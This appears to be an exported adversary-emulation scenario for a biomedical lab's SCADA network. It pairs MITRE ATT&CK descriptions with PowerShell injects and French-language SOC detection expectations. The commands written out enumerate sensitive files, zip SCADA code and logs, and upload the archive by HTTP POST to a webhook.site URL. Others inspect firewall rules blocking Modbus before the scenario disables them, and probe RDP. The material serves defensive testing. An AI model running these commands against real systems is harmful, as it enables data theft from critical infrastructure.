payload_attack_patterns.attack_pattern_description: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport. Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as tar on Linux and macOS or zip on Windows systems. On Windows, diantz or makecab may be used to package collected files into a cabinet (.cab) file. diantz may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) xcopy on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to gather data of interest to their goal.

Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.

injector_contract_payload.command_content:
Compress-Archive -Path "C:\SCADA\HMI\api\*.py","C:\SCADA\HMI\web\*.html","C:\SCADA\logs\*.log" -DestinationPath "C:\Windows\Temp\research_backup.zip" -CompressionLevel Optimal -Force
Get-Item "C:\Windows\Temp\research_backup.zip" | Select-Object Name,Length,CreationTime | Format-List

payload_attack_patterns.attack_pattern_description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas) A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023) Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms) Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to communicate with compromised systems to control them.

Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.

payload_attack_patterns.attack_pattern_description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363), [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to run malicious code.

Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to figure out your environment.

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

The adversary is trying to move through your environment.

Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.

injector_contract_payload.command_content:
$env:COMPUTERNAME
$env:USERDOMAIN + "\" + $env:USERNAME
(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -like '10.*'}).IPAddress
(Get-CimInstance Win32_OperatingSystem).Caption

scenario_injects.inject_description: EXFILTRATION CRITIQUE: L'attaquant upload archive compressée vers serveur C2 externe via HTTP POST. Utilisation webhook.site (service test public) comme destination réaliste pour simulation. Exfiltration ~30MB données sensibles laboratoire: configurations SCADA, logs PLCs, codes Python API, templates HMI. Protocole HTTP (port 443) choisi car moins suspicieux que protocoles exotiques, passe souvent firewalls sortants. Exfiltration post-sabotage typique APT: destruction physique (Phase 7) + vol propriété intellectuelle (Phase 8) = impact maximal.

expectations.expectation_name: DLP/Firewall détecte exfiltration HTTP données critiques laboratoire
expectations.expectation_description: DLP détecte upload HTTP POST 30MB archive ZIP contenant configurations SCADA + logs PLCs + code Python API = EXFILTRATION CRITIQUE confirmée. Destination: webhook.site (service anonyme suspects). Sysmon Event 3: powershell.exe connexion HTTPS sortante. Corrélation complète attaque Phases 1-8: phishing → privilege escalation → defense bypass → sabotage OT → exfiltration IP = APT sophistiqué campagne complète.

expectations.expectation_name: Firewall/DLP bloque upload HTTP données sensibles
expectations.expectation_description: irewall sortant avec DLP intégré détecte Invoke-WebRequest POST avec fichier ZIP volumineux vers domaine externe suspect (webhook.site). Politique: blocage uploads >10MB vers domaines non whitelisted. DLP analyse contenu archive détecte données classifiées SCADA/PLCs. Exfiltration bloquée au niveau réseau.

expectations.expectation_name: SOC déclare exfiltration réussie - notification autorités/assurances
expectations.expectation_description: Analyste confirme exfiltration HTTP réussie = vol propriété intellectuelle confirmé après sabotage physique. Actions: (1) Isolation réseau serveur SCADA (trop tard mais limite dégâts futurs), (2) Notification CERT/ANSSI: exfiltration données critiques infrastructure santé, (3) Notification CNIL (RGPD si données personnelles), (4) Forensics réseau: capture destination C2, (5) Attribution investigation: APT nation-state?, (6) Notification direction/assurances: attaque complète réussie (sabotage + vol), pertes totales €25M+ + IP compromise, (7) Préparation communication crise: violation données laboratoire.

injector_contract_payload.payload_description: EXFILTRATION CRITIQUE: L'attaquant upload archive compressée vers serveur C2 externe via HTTP POST. Utilisation webhook.site (service test public) comme destination réaliste pour simulation. Exfiltration ~30MB données sensibles laboratoire: configurations SCADA, logs PLCs, codes Python API, templates HMI. Protocole HTTP (port 443) choisi car moins suspicieux que protocoles exotiques, passe souvent firewalls sortants. Exfiltration post-sabotage typique APT: destruction physique (Phase 7) + vol propriété intellectuelle (Phase 8) = impact maximal.

payload_attack_patterns.attack_pattern_description:
Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to steal data.

Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.

The adversary is trying to steal data.

Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.

injector_contract_payload.command_content: Invoke-WebRequest -Uri "https://webhook.site/494c2f45-9aec-4b1e-b6d7-6abd75117c6f" -Method POST -InFile "C:\Windows\Temp\research_backup.zip" -ContentType "application/zip" -UseBasicParsing | Select-Object StatusCode,StatusDescription | Format-List

injector_contract_payload.payload_description: Analyse détaillée des 3 règles block: L'attaquant examine précisément chaque règle bloquant l'accès Modbus (PowerShell, Python, CMD) pour comprendre leur configuration exacte et confirmer qu'elles sont actuellement actives (Enabled: True). Cette analyse exhaustive confirme que 3 défenses distinctes empêchent accès Modbus, justifiant leur désactivation complète pour garantir flexibilité Phase 7. Un attaquant sophistiqué vérifie l'état exact des défenses avant bypass.

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to figure out your environment.

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

injector_contract_payload.command_content:
Get-NetFirewallRule -DisplayName "P14-Block-Modbus-PowerShell" | Select-Object DisplayName,Enabled,Direction,Action,Program | Format-List
Get-NetFirewallRule -DisplayName "P14-Block-Modbus-Python" | Select-Object DisplayName,Enabled,Direction,Action,Program | Format-List
Get-NetFirewallRule -DisplayName "P14-Block-Modbus-CMD" | Select-Object DisplayName,Enabled,Direction,Action,Program | Format-List

payload_attack_patterns.attack_pattern_description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as [Ping](https://attack.mitre.org/software/S0097), net view using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`. Adversaries may also analyze data from local host files (ex: C:\Windows\System32\Drivers\etc\hosts or /etc/hosts) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment. Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)

injector_contract_payload.command_content:
$target = "10.0.0.10"
$rdpPort = 3389
$rdpTest = Test-NetConnection -ComputerName $target -Port $rdpPort -WarningAction SilentlyContinue

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

payload_attack_patterns.attack_pattern_description:
Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.

injector_contract_payload.command_content:
$h = $env:COMPUTERNAME
$u = "$env:USERDOMAIN\$env:USERNAME"
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -like '10.*'}).IPAddress
Write-Host "[+] Foothold: $h | $u | $ip"

Pattern: reconnaissance pré-sabotage typique - attaquant lit valeurs normales avant manipulation. Sysmon Event 3 corrélé: python.exe connexion TCP vers PLC1

SOC décide: isolation immédiate PLCs ou surveillance intensive pour capturer write commands (forensics). Activation protocole urgence: équipe terrain prête intervention physique.

scenario_injects.inject_description: Reconnaissance données sensibles: L'attaquant énumère les fichiers et dossiers contenant données critiques du laboratoire biomédical pour préparer exfiltration. Recherche ciblée: documents recherche, résultats expériences, configurations SCADA, logs PLCs, bases données échantillons. Cette reconnaissance permet d'identifier données haute valeur (propriété intellectuelle, résultats R&D, données clients) pour maximiser impact exfiltration après sabotage physique Phase 7.

expectations.expectation_description: Solution Data Loss Prevention (DLP) détecte pattern énumération massive fichiers sensibles (.docx, .xlsx, .pdf) et bloque Get-ChildItem récursif sur répertoires critiques. Politique DLP empêche découverte données classifiées.

expectations.expectation_name: EDR détecte reconnaissance fichiers avant exfiltration
expectations.expectation_description: EDR détecte Get-ChildItem récursif avec filtres extensions spécifiques (.docx, .xlsx, .pdf, .csv) = pattern reconnaissance pré-exfiltration. Sysmon Event 1: powershell.exe Get-ChildItem -Recurse. Corrélation avec activités malveillantes précédentes (Phases 1-7) élève criticité.

Analyste détecte énumération fichiers après sabotage OT Phase 7 = attaquant prépare exfiltration données. Pattern APT typique: destruction physique + vol IP. SOC active surveillance DLP/réseau pour bloquer exfiltration imminente.

injector_contract_payload.payload_description: Reconnaissance données sensibles: L'attaquant énumère les fichiers et dossiers contenant données critiques du laboratoire biomédical pour préparer exfiltration. Recherche ciblée: documents recherche, résultats expériences, configurations SCADA, logs PLCs, bases données échantillons. Cette reconnaissance permet d'identifier données haute valeur (propriété intellectuelle, résultats R&D, données clients) pour maximiser impact exfiltration après sabotage physique Phase 7.

payload_attack_patterns.attack_pattern_description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Many command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).(Citation: US-CERT-TA18-106A) Some files and directories may require elevated or specific user permissions to access.

attack_pattern_kill_chain_phases.phase_description:
The adversary is trying to figure out your environment.

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

payload_attack_patterns.attack_pattern_description:
Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. 

In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) 

This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.

Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.

Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.

injector_contract_payload.command_content:
Get-ChildItem -Path "C:\SCADA" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Extension -match '\.(docx|xlsx|pdf|csv|txt|json|db|log)$'} | Select-Object FullName,Length,LastWriteTime | Format-Table -AutoSize
Get-ChildItem -Path "C:\Users" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Extension -match '\.(docx|xlsx|pdf)$' -and $_.Length -lt 50MB} | Select-Object FullName,Length | Format-Table -AutoSize
